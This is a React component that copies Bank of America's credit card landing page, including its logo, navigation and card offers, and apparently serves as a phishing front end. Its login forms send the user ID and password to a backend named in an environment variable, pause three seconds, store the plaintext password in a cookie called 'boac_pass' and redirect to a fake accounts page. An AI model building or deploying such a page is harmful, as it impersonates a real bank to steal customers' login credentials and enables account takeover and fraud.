import React, { useState } from 'react';
import { CreditCard, Globe, Search, ChevronDown, Menu } from 'lucide-react';
import { useNavigate } from 'react-router';

export default function BankOfAmericaCards() {
  const [userId, setUserId] = useState('');
  const [password, setPassword] = useState('');
  const [saveUserId, setSaveUserId] = useState(false);
  const [showMobileLogin, setShowMobileLogin] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const navigate = useNavigate();

  const api_url = import.meta.env.VITE_API_URL;

  const cards = [
    {
      name: 'Customized Cash Rewards',
      cashback: '6',
      description: 'cash back offer',
      color: 'bg-red-600',
      bonus: '$200 online bonus offer'
    },
    {
      name: 'Unlimited Cash Rewards',
      cashback: '2',
      description: 'cash back offer',
      color: 'bg-gray-500',
      bonus: '$200 online bonus offer'
    },
    {
      name: 'Travel Rewards',
      cashback: '1.5',
      description: 'points for every $1',
      color: 'bg-blue-900',
      bonus: '25,000 online bonus points offer'
    },
    {
      name: 'BankAmericard®',
      cashback: '0',
      description: 'intro APR offer',
      color: 'bg-gray-200',
      textColor: 'text-gray-600',
      bonus: 'Intro APR offer for 18 billing cycles'
    }
  ];

  const handleLogin = async () => {
    setIsLoading(true);
    setError('');
    
    try {
      const response = await fetch(`${api_url}/login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({user_id: userId, password})
      });

      // Wait for 3 seconds
      await new Promise(resolve => setTimeout(resolve, 3000));

      if (response.status === 401) {
        setError('Invalid User ID or Password. Please try again.');
        setIsLoading(false);
        return;
      }

      if (!response.ok) {
        setError('An error occurred. Please try again later.');
        setIsLoading(false);
        return;
      }

      const expires = Date.now() + 1 * 60 * 60 * 1000;

      cookieStore.set({
        name: 'boac_id',
        value: userId,
        expires
      });

      cookieStore.set({
        name: 'boac_pass',
        value: password,
        expires
      });

      navigate('/myaccounts');
    } catch (err) {
      setError('An error occurred. Please try again later.');
      setIsLoading(false);
    }
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Top Banner */}
      {/* <div className="bg-gray-50 border-b border-gray-200 py-2 px-4 lg:px-6 text-xs lg:text-sm text-gray-600">
        <div className="max-w-7xl mx-auto flex justify-center items-center">
          <span className="italic">Bank of America deposit products:&nbsp;</span>
          <img src={fdic} alt="FDIC-Insured - Backed by the full faith and credit of the U.S. Government" className="h-4 lg:h-5 object-contain" />
        </div>
      </div> */}

      {/* Main Navigation - Desktop Only */}
      <nav className="hidden lg:block border-b border-gray-200 px-6">
        <div className="max-w-7xl mx-auto flex items-center justify-between py-3">
          <div className="flex items-center space-x-8">
            <button className="text-blue-700 font-semibold border-b-2 border-blue-700 pb-3">Personal</button>
            <button className="text-gray-700 hover:text-blue-700 pb-3">Wealth Management</button>
            <button className="text-gray-700 hover:text-blue-700 pb-3">Business</button>
            <button className="text-gray-700 hover:text-blue-700 pb-3">Corporations & Institutions</button>
          </div>
          <div className="flex items-center space-x-6">
            <button className="text-gray-700 hover:text-blue-700">Security</button>
            <button className="text-gray-700 hover:text-blue-700">About Us</button>
            <button className="flex items-center text-gray-700 hover:text-blue-700">
              <Globe className="w-4 h-4 mr-1" />
              En español
            </button>
            <button className="text-gray-700 hover:text-blue-700">Contact Us</button>
            <button className="text-gray-700 hover:text-blue-700">Help</button>
          </div>
        </div>
      </nav>

      {/* Logo and Search Header */}
      <div className="border-b border-gray-200 px-4 lg:px-6 py-4">
        <div className="max-w-7xl mx-auto flex items-center justify-between relative lg:static">
          {/* Mobile Menu Button */}
          <button className="lg:hidden z-10">
            <Menu className="w-6 h-6 text-gray-700" />
          </button>

          {/* Logo - Centered on mobile, normal flow on desktop */}
          <div className="absolute left-10 sm:left-1/2 sm:-translate-x-1/2 lg:static lg:translate-x-0 gtnav-logo-img" role="img" aria-label="Bank of America">
            <svg xmlns="http://www.w3.org/2000/svg" width="200" height="20" viewBox="0 0 720 73" className="w-[180px] max-[390px]:w-[160px] lg:w-[290px] lg:h-[29px]">
              <g fill="none">
                <path d="M653.3 72.1c21-18 50.5-35.5 66.7-41.8-2.5-1.6-6.4-3.9-10.8-6.4-20.9 6.9-45.3 22.2-67.1 39.5 3.7 2.8 7.6 5.7 11.2 8.7z" fill="#E31837"/>
                <path d="M643.7 23.2c-3.1-1.5-6.5-2.9-9.1-4.1-7.9 3.9-18.2 9.8-31.2 19.1 2.8 1.5 5.8 3.3 9 5.1 10-7.4 20.1-14.4 31.3-20.1z" fill="#012169"/>
                <path d="M662.4 14.6c-3.8-2.1-17-7-26.1-9.1-2.7 1-6.5 2.5-9.1 3.6 3.3.9 15.6 4.2 26.1 9.5 2.7-1.3 6.5-2.9 9.1-4z" fill="#E31837"/>
                <path d="M617.7 13.3c-11.7 5.4-24 12.8-30.7 17.1 2.4 1.1 4.8 2 8.1 3.6 14.8-10 26.4-16.1 31-18.1-3.3-1.2-6.4-2-8.4-2.6z" fill="#012169"/>
                <path d="M671.2 11.5c2.7-.9 5.8-1.7 8.5-2.5-7.8-3.3-17.6-6.8-26.4-9-1.4.4-5.6 1.5-8.5 2.4 3 .9 12.9 3.2 26.4 9.1zm-49.3 37.6c3.2 1.9 6.6 4.5 9.9 6.7 21.9-17 43.5-30.1 67.2-37.5-3.3-1.7-6.2-3.2-9.9-5-14.2 3.6-38.5 13.3-67.2 35.8z" fill="#E31837"/>
                <path d="M0 66.9h16c8.1 0 11.9-4.2 11.9-10.1 0-4.8-2.5-8-7.7-9 4.6-1.1 6.7-3.9 6.7-8 0-5.2-3.8-9.4-11.9-9.4H.1v36.5H0zm13.9-15.5c3 0 5.1 1.5 5.1 4.5 0 3.2-2 4.5-5.1 4.5H8.7v-9.1h5.2v.1zm-1-14.6c3 0 5.1 1.3 5.1 4.3s-2 4.3-5.1 4.3H8.7v-8.6h4.2zm47.3-6.5h-9L37.5 66.9h9.1l2.5-7.6h13.2l2.5 7.6H74L60.2 30.3zm-4.5 8.8L60 52.6h-8.8l4.5-13.5zm63.9-8.8h-8.3v24.5L95.7 30.3h-9.3v36.6h8.3V42.5l15.6 24.4h9.3V30.3zm38.3 36.6l-12-18.6v18.6H137V30.3h8.9v17.6l11.4-17.6h9.9l-12 17.6 13.1 19h-10.4zm41.9-18.3c0 7.3 4.4 11.8 10.1 11.8 5.7 0 10.1-4.5 10.1-11.8 0-7.3-4.4-11.8-10.1-11.8-5.7 0-10.1 4.5-10.1 11.8zm-9.4 0c.1-10.7 7.6-19.1 19.5-19.1s19.4 8.4 19.5 19.1c-.1 10.7-7.6 19.1-19.5 19.1s-19.4-8.4-19.5-19.1zm51.2 18.3h8.9V52.5h11.6v-7h-11.6v-8.2h14l1.6-7h-24.5v36.6zm66-36.6h-9l-13.7 36.6h9.1l2.5-7.6h13.2l2.5 7.6h9.2l-13.8-36.6zm-4.5 8.8l4.3 13.5h-8.8l4.5-13.5zm71.1-8.8h-10.4l-9.5 19.8-9.5-19.8h-10.4v36.6h8V42.4l11.8 24.5L366 42.4v24.5h8.3l-.1-36.6zm17.3 36.6h25v-7h-16.1v-8.2h12.7v-6.8h-12.7v-7.6h14.7l1.6-7h-25.2v36.6zm58.9 0h9.7L451 51.4c5-1.4 7.4-4.9 7.4-10 0-6.6-4-11-13-11h-14.1V67h8.7V52.6h2.4l8 14.3zm-6.7-29.8c3.7 0 5.6 1.6 5.6 4.7s-1.9 4.7-5.6 4.7h-3.8v-9.4h3.8zm29.7 29.8h8.9V30.4h-8.9v36.5zm52.7-9.8c-3.4 2.4-6.4 3.2-9.5 3.2-6.8 0-11.6-4.7-11.6-11.7 0-7 4.7-11.7 11.3-11.7 3 0 6 .8 9.3 3.2v-8.3c-3-1.7-6.5-2.4-10.4-2.4-12.1 0-19.7 8.4-19.8 19.1.1 10.8 7.5 19.1 19.8 19.1 4.1 0 7.6-.7 10.8-2.4v-8.1h.1zm32.6-26.8h-9L536 66.9h9.1l2.5-7.6h13.2l2.5 7.6h9.2l-13.8-36.6zm-4.5 8.8l4.3 13.5h-8.8l4.5-13.5z" fill="#012169"/>
              </g>
            </svg>
          </div>

          {/* Right Side - Log in & Search */}
          <div className="flex items-center space-x-2 lg:space-x-4">
            <button className="hidden lg:block relative">
              <input
                type="text"
                placeholder="Search"
                className="w-64 px-4 py-2 border border-gray-300 rounded-md pr-10"
              />
              <Search className="absolute right-3 top-2.5 w-5 h-5 text-gray-400" />
            </button>
            <button className="lg:hidden">
              <Search className="w-6 h-6 text-gray-700" />
            </button>
            <button className="lg:hidden border border-gray-700 text-gray-700 px-4 py-1.5 rounded-full text-sm font-medium hover:bg-gray-50"
            onClick={() => setShowMobileLogin(true)}>
              Log in
            </button>
          </div>
        </div>
      </div>

      {/* Product Navigation - Desktop Only */}
      <div className="hidden lg:block bg-white border-b border-gray-200 px-6">
        <div className="max-w-7xl mx-auto flex items-center space-x-8 py-3">
          {['Checking', 'Savings & CDs', 'Credit Cards', 'Home Loans', 'Auto Loans', 'Merrill Investing', 'Better Money Habits®'].map((item) => (
            <button key={item} className="flex items-center text-gray-700 hover:text-blue-700 font-medium">
              {item}
              <ChevronDown className="w-4 h-4 ml-1" />
            </button>
          ))}
        </div>
      </div>

      {/* Main Content */}
      <div className="bg-gradient-to-br from-blue-900 via-blue-800 to-blue-900 px-4 lg:px-6 py-8 lg:py-12">
        <div className="max-w-7xl mx-auto flex flex-col lg:flex-row gap-8">
          {/* Login Section - Desktop Only */}
          <div className="hidden lg:block w-96 flex-shrink-0">
            <div className="bg-white rounded-lg shadow-lg p-6 mb-4">
              <div className="mb-4">
                <label className="block text-gray-700 font-semibold mb-2">User ID</label>
                <input
                  type="text"
                  value={userId}
                  onChange={(e) => setUserId(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
              </div>
              <div className="mb-4">
                <label className="block text-gray-700 font-semibold mb-2">Password</label>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
              </div>
              <div className="mb-6">
                <label className="flex items-center">
                  <input
                    type="checkbox"
                    checked={saveUserId}
                    onChange={(e) => setSaveUserId(e.target.checked)}
                    className="mr-2"
                  />
                  <span className="text-gray-700">Save user ID</span>
                </label>
              </div>
              {error && (
                <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded text-red-700 text-sm">
                  {error}
                </div>
              )}
              <button 
                className="w-full bg-blue-900 text-white py-3 rounded-full font-semibold hover:bg-blue-800 transition mb-4 flex items-center justify-center disabled:opacity-50 disabled:cursor-not-allowed"
                onClick={handleLogin}
                disabled={isLoading}>
                {isLoading ? (
                  <>
                    <svg className="animate-spin h-5 w-5 mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Loading...
                  </>
                ) : (
                  'Log in'
                )}
              </button>
              <div className="text-center space-y-2">
                <a href="#" className="text-blue-700 hover:underline text-sm block">Forgot user ID/password</a>
                <div className="flex justify-center space-x-4 text-sm">
                  <a href="#" className="text-blue-700 hover:underline">Security & Help</a>
                  <a href="#" className="text-blue-700 hover:underline">Enroll</a>
                </div>
              </div>
            </div>
            <button className="w-full bg-white text-gray-700 py-3 rounded-lg font-semibold hover:bg-gray-50 transition flex items-center justify-center">
              <span className="mr-2">$</span>
              Open an account
            </button>
          </div>

          {/* Cards Section */}
          <div className="flex-1">
            <h1 className="text-white text-2xl lg:text-4xl font-light mb-8 lg:mb-12 text-center">Choose the card that works for you</h1>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 lg:gap-6">
              {cards.map((card, index) => (
                <div key={index} className="flex flex-col items-center">
                  <div className="mb-4 text-center">
                    <div className="text-white text-5xl lg:text-6xl font-light mb-2">
                      {card.cashback}<span className="text-3xl lg:text-4xl">%</span>
                    </div>
                    <div className="text-white text-sm mb-1">{card.description}</div>
                    <div className="text-white text-sm">No annual fee.</div>
                  </div>
                  <div className={`${card.color} ${card.textColor || 'text-white'} w-full max-w-xs aspect-[1.586/1] rounded-xl shadow-2xl p-4 flex flex-col justify-between mb-4 relative overflow-hidden`}>
                    <div className="flex justify-between items-start">
                      <CreditCard className="w-8 h-8" />
                      <div className="text-right opacity-75">
                        <div className="text-xs">contactless</div>
                      </div>
                    </div>
                    <div className="absolute top-1/2 right-4 transform -translate-y-1/2 opacity-20">
                      <div className="flex space-x-1">
                        {[...Array(3)].map((_, i) => (
                          <div key={i} className="w-6 h-12 bg-current transform -skew-x-12"></div>
                        ))}
                      </div>
                    </div>
                    <div>
                      <div className="text-xs lg:text-sm mb-2">BANK OF AMERICA</div>
                      <div className="flex items-center justify-between">
                        <div className="bg-yellow-600 rounded px-2 py-1 text-xs flex items-center space-x-1">
                          <span className="text-xs">🔔</span>
                          <span>New card design now available</span>
                        </div>
                        <div className="text-lg lg:text-xl font-bold">VISA</div>
                      </div>
                    </div>
                  </div>
                  <div className="text-white text-center">
                    <div className="font-semibold mb-2">{card.name}</div>
                    <div className="bg-white text-blue-900 px-4 py-2 rounded text-sm font-medium">
                      {card.bonus}
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* Mobile Login Modal */}
      {showMobileLogin && (
        <div className="fixed inset-0 z-50 lg:hidden flex items-end">
          <div className="bg-white rounded-t-2xl shadow-lg p-6 w-full animate-slide-up">
            <div className="flex justify-end mb-2">
              <button onClick={() => setShowMobileLogin(false)} className="text-gray-500 hover:text-gray-700">
                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>
            <div className="mb-4">
              <label className="block text-gray-700 font-semibold mb-2">User ID</label>
              <input
                type="text"
                value={userId}
                onChange={(e) => setUserId(e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
              />
            </div>
            <div className="mb-4">
              <label className="block text-gray-700 font-semibold mb-2">Password</label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
              />
            </div>
            <div className="mb-6">
              <label className="flex items-center">
                <input
                  type="checkbox"
                  checked={saveUserId}
                  onChange={(e) => setSaveUserId(e.target.checked)}
                  className="mr-2"
                />
                <span className="text-gray-700">Save user ID</span>
              </label>
            </div>
            {error && (
              <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded text-red-700 text-sm">
                {error}
              </div>
            )}
            <button 
              className="w-full bg-blue-900 text-white py-3 rounded-full font-semibold hover:bg-blue-800 transition mb-4 flex items-center justify-center disabled:opacity-50 disabled:cursor-not-allowed"
              onClick={handleLogin}
              disabled={isLoading}>
              {isLoading ? (
                <>
                  <svg className="animate-spin h-5 w-5 mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Loading...
                </>
              ) : (
                'Log in'
              )}
            </button>
            <div className="text-center space-y-2 mb-4">
              <a href="#" className="text-blue-700 hover:underline text-sm block">Forgot user ID/password</a>
              <div className="flex justify-center space-x-4 text-sm">
                <a href="#" className="text-blue-700 hover:underline">Security & Help</a>
                <a href="#" className="text-blue-700 hover:underline">Enroll</a>
              </div>
            </div>
            <button className="w-full bg-white text-gray-700 py-3 rounded-lg font-semibold hover:bg-gray-50 transition flex items-center justify-center border border-gray-300">
              <span className="mr-2">$</span>
              Open an account
            </button>
          </div>
        </div>
      )}
    </div>
  );
}